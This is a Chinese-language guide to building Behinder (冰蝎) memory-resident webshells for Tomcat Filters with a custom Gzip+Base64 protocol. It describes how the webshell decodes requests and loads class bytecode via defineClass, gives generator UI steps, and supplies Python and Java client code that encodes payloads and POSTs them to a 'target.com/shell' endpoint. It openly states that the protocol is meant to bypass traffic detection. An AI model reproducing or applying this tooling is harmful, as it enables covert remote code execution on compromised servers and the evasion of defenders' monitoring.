# 为冰蝎添加自定义通信协议 - 重要说明

## 问题发现

在实际测试中发现，生成的内存马中出现了 `pass="321fc64c803d431f"`（MD5 后的密钥），这说明**没有正确使用自定义协议模板**。

## 冰蝎 4 协议机制详解

### 1. 默认 AES 协议

```java
// 服务端 Filter
public static String pass = "321fc64c803d431f";  // MD5(明文 pass).substring(0,16)
public static String headerName = "User-Agent";
public static String headerValue = "nAQAxSdm";

// 通信流程
1. 客户端发送：AES 加密 (payload, key=pass)
2. 服务端接收：检查 headerName 和 headerValue 匹配
3. 服务端解密：AES 解密 (请求体，key=pass)
4. 加载执行：defineClass(解密后的字节码)
```

**关键点**：
- `pass` 是**静态固定**的 AES 密钥
- 用于加密/解密整个 payload
- Session 中存储 `"u" = pass` 用于验证

### 2. 自定义协议（Gzip+Base64）

```java
// 服务端 Filter
public static String headerName = "User-Agent";
public static String headerValue = "nAQAxSdm";
// NO pass field! 不需要密码

// 通信流程
1. 客户端发送：添加 10 字节头 + 12 字节尾 + Base64(替换后 Base64(GZIP(payload)))
2. 服务端接收：检查 headerName 和 headerValue 匹配
3. 服务端解密：
   - 去掉头尾（跳过 10 字节，保留到 length-12）
   - Base64 解码
   - 字符替换（<→+, >→/）
   - Base64 解码
   - GZIP 解压
4. 加载执行：defineClass(解密后的字节码)
```

**关键点**：
- **不需要密码**！完全无加密
- 仅通过请求头识别恶意请求
- 适合绕过某些流量检测

## 正确生成步骤

### Web UI 操作

1. 访问 http://127.0.0.1:8080/ui
2. 选择目标服务：Tomcat
3. 内存马功能：**Behinder**
4. **通信协议：选择 "Custom (Gzip+Base64)"** ⚠️ 必须选择此项
5. 填写请求头配置：
   - headerName: `User-Agent`
   - headerValue: `nAQAxSdm`（你的自定义值）
6. 选择挂载类型：Filter
7. 点击生成

## 常见错误

### 错误 1：生成了 AES 模板

**症状**：反编译后看到 `pass = "xxx"` 和 `Cipher.getInstance("AES")`

**原因**：
- Web UI 中**没有选择** "Custom (Gzip+Base64)" 协议
- 或者前端没有正确传递 `behinderProtocol` 参数

**解决**：确保 Web UI 中选择了正确的协议选项

### 错误 2：客户端连接失败

**症状**：内存马注入成功，但客户端连接时报解密错误

**原因**：
- 客户端使用了 AES 加密，但服务端是自定义协议
- 或者客户端协议配置不匹配

**解决**：
- 冰蝎客户端需要实现对应的自定义协议
- 或者使用我们提供的自定义协议连接脚本

## 客户端实现参考

### Python 自定义协议加密

```python
import gzip
import base64

def encrypt_payload(payload_bytes):
    """
    自定义协议加密流程（与服务端解密相反）
    """
    # 1. GZIP 压缩
    compressed = gzip.compress(payload_bytes)
    
    # 2. 第一次 Base64 编码
    base64_1 = base64.b64encode(compressed).decode()
    
    # 3. 字符替换（与服务器解密相反）
    replaced = base64_1.replace('+', '<').replace('/', '>')
    
    # 4. 第二次 Base64 编码
    base64_2 = base64.b64encode(replaced.encode()).decode()
    
    # 5. 添加 10 字节头部（可以自定义）
    header = b'\x00' * 10
    
    # 6. 添加 12 字节尾部（可以自定义）
    tailer = b'\x00' * 12
    
    # 7. 最终 payload
    final = header + base64_2.encode() + tailer
    return final

# 使用示例
payload = b'your_bytecode_here'
encrypted = encrypt_payload(payload)

# 发送请求
import requests
headers = {
    'User-Agent': 'nAQAxSdm'  # 与生成的内存马一致
}
response = requests.post(
    'http://target.com/shell',
    headers=headers,
    data=encrypted
)
```

### Java 自定义协议加密

```java
import java.io.ByteArrayOutputStream;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

public class CustomProtocolEncryptor {
    
    public static byte[] encrypt(byte[] payload) throws Exception {
        // 1. GZIP 压缩
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        GZIPOutputStream gzos = new GZIPOutputStream(baos);
        gzos.write(payload);
        gzos.close();
        byte[] compressed = baos.toByteArray();
        
        // 2. 第一次 Base64
        String base64_1 = Base64.getEncoder().encodeToString(compressed);
        
        // 3. 字符替换
        String replaced = base64_1.replace('+', '<').replace('/', '>');
        
        // 4. 第二次 Base64
        byte[] base64_2 = Base64.getEncoder().encode(replaced.getBytes());
        
        // 5. 添加头尾
        ByteArrayOutputStream finalOut = new ByteArrayOutputStream();
        finalOut.write(new byte[10]);  // 10 字节头
        finalOut.write(base64_2);
        finalOut.write(new byte[12]);  // 12 字节尾
        
        return finalOut.toByteArray();
    }
}
```

## 检查清单

生成后务必验证：

- [ ] Web UI 中选择了 "Custom (Gzip+Base64)" 协议
- [ ] 生成的字节码**不包含** `Cipher` 或 `AES` 关键字
- [ ] 生成的字节码**包含** `GZIPInputStream` 关键字
- [ ] 生成的字节码**不包含** `pass = "xxx"` 静态字段
- [ ] 请求头配置与客户端一致（headerName 和 headerValue）

## 对比表

| 特性 | AES 协议 | 自定义协议 |
|------|----------|------------|
| 密钥 | pass (MD5 后 16 位) | 无密钥 |
| 加密方式 | AES/ECB/PKCS5Padding | 无加密，仅编码 |
| 解密类 | `javax.crypto.Cipher` | `java.util.zip.GZIPInputStream` |
| 静态字段 | `pass`, `headerName`, `headerValue` | `headerName`, `headerValue` |
| Session 属性 | `"u" = pass` | `"u" = headerValue` |
| 流量特征 | AES 加密数据 | Base64 编码数据 |
| 检测难度 | 较难（加密） | 中等（编码特征） |
